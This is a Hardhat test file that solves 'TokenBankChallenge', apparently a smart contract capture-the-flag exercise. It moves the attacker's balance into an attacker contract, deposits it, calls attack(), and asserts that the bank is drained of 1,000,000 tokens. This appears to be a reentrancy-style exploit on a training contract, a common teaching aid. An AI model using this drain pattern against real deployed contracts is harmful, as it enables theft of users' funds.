const { expect } = require("chai");
const { buildContract } = require("../utils");

it("Solves TokenBankChallenge", async function () {
  const [, attacker] = await ethers.getSigners();
  const bankContract = await buildContract("TokenBankChallenge", 0, attacker);
  const bankContractConnectedToAttacker = bankContract.connect(attacker);

  // Get address of bank and token contract.
  const bankAddress = await bankContract.getAddress();
  const tokenAddress = await bankContract.token();

  // Attach token contract.
  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  const tokenContract = tokenFactory.attach(tokenAddress);
  const tokenContractConnectedToAttacker = tokenContract.connect(attacker);

  // Deploy attacker contract.
  const attackerContract = await buildContract("TokenBankChallengeAttacker", 0, tokenAddress, bankAddress);

  // Withdraw attacker's balance from bank and transfer to attacker contract.
  const balance = await bankContract.balanceOf(await attacker.getAddress());
  await bankContractConnectedToAttacker.withdraw(balance);
  await tokenContractConnectedToAttacker.transfer(await attackerContract.getAddress(), balance);

  // Deposit attacker contract to bank, then attack.
  await attackerContract.depositToBank();
  await attackerContract.attack();

  expect(await bankContract.isComplete()).to.equal(true);
  expect(await tokenContract.balanceOf(await attackerContract.getAddress())).to.equal(ethers.parseEther("1000000"));
});
